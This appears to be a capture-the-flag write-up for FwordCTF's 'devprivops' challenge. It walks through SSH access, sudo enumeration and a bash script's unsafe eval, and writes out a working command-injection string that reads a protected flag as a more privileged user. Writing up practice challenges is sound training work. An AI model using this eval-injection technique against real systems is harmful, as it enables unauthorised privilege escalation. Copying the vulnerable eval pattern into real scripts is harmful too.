# devprivops
## Description
```
Well good luck elevating your privs x)
ssh -p 10000 ctf@devprivops.fword.tech
Password: FwOrDAndKahl4FTW
Author: Kahla
```

SSH into it:
```
ssh -p 10000 ctf@devprivops.fword.tech
 _____                       _
|  ___|_      _____  _ __ __| |
| |_  \ \ /\ / / _ \| '__/ _` |
|  _|  \ V  V / (_) | | | (_| |
|_|     \_/\_/ \___/|_|  \__,_|

ctf@devprivops.fword.tech's password:
DISCLAIMER: Please don't abuse the server !

These Tasks were done to practice some Linux

Author: Kahla, Contact me for any problems


** It may take some time! We are preparing the environment for you! **

Kindly Sponsored By Root-Me Pro
user1@19e8d2367bf3:/home/user1$ ls
devops.sh  flag.txt
user1@19e8d2367bf3:/home/user1$ cat flag.txt
cat: flag.txt: Permission denied
```
You can see there is two files, and we cannot read the flag:
```bash
ls -la
total 32
drwxrwxr-t 1 root  user1           4096 Aug 27 22:44 .
drwxr-xr-x 1 root  root            4096 Aug 27 22:43 ..
-rw-r--r-- 1 user1 user1            220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 user1 user1           3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 user1 user1            807 Feb 25  2020 .profile
-rwxr-xr-x 1 root  user-privileged  945 Aug 27 22:09 devops.sh
-rwxr----- 1 root  user-privileged   67 Aug 27 22:09 flag.txt
```

After I enumerate the container, notice something interesting when I run `sudo -l`:
```bash
sudo -l
Matching Defaults entries for user1 on 19e8d2367bf3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on 19e8d2367bf3:
    (user-privileged) NOPASSWD: /home/user1/devops.sh
```

This means we are allow to run `devops.sh` as `user-privileged` without password!!

## Privilege Escalation

Look at the `devops.sh`
```bash
#!/bin/bash
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:"
exec 2>/dev/null
name="deploy"
while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -V | --version )
    echo "Beta version"
    exit
    ;;
  -d | --deploy )
     deploy=1
     ;;
  -p | --permission )
     permission=1
     ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi

echo -ne "Welcome To Devops Swiss Knife \o/\n\nWe deploy everything for you:\n"


if [[ deploy -eq 1 ]];then
        echo -ne "Please enter your true name if you are a shinobi\n"
        read -r name
        eval "function $name { terraform init &>/dev/null && terraform apply &>/dev/null ; echo \"It should be deployed now\"; }"
        export -f $name
fi

isAdmin=0
# Ofc only admins can deploy stuffs o//
if [[ $isAdmin -eq 1 ]];then
        $name
fi

# Check your current permissions admin-san
if [[ $permission -eq 1 ]];then
        echo "You are: "
        id
fi
```
The PATH variable is set, so we cannot change the PATH and add fake binary to execute code...

Then I notice a line got `eval` and we can control `name` variable:
```bash
if [[ deploy -eq 1 ]];then
	echo -ne "Please enter your true name if you are a shinobi\n"
	read -r name
	eval "function $name { terraform init &>/dev/null && terraform apply &>/dev/null ; echo \"It should be deployed now\"; }"
	export -f $name
fi
```

Then I create my own script in my machine to test:
```bash
#!/bin/bash
read -r name
eval "function $name { echo hi; }"
```

After some trial and error, I were able to inject code using `a { id; }; echo hi; function b`!!

Try in the container:
```
./devops.sh -d
Welcome To Devops Swiss Knife \o/

We deploy everything for you:
Please enter your true name if you are a shinobi
FwOrDAndKahl4FTW
user1@0c8dfb54caa4:/home/user1$ ./devops.sh -d
Welcome To Devops Swiss Knife \o/

We deploy everything for you:
Please enter your true name if you are a shinobi
a { id; }; echo hi; function b
hi
```

Then try run with `sudo` command to run as the `user-privileged` and inject `cat flag.txt`:
```
sudo -u user-privileged ./devops.sh -d
Welcome To Devops Swiss Knife \o/

We deploy everything for you:
Please enter your true name if you are a shinobi
a { id; }; cat flag.txt; function b{
FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
``` 
We get the flag! That it!

## Flag
```
FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
```

## Intended Solution
The author of challenge said the intended solution is run a terraform script to xfiltrate the flag:
https://discord.com/channels/736202333863542826/881404600496820294/881412916224614400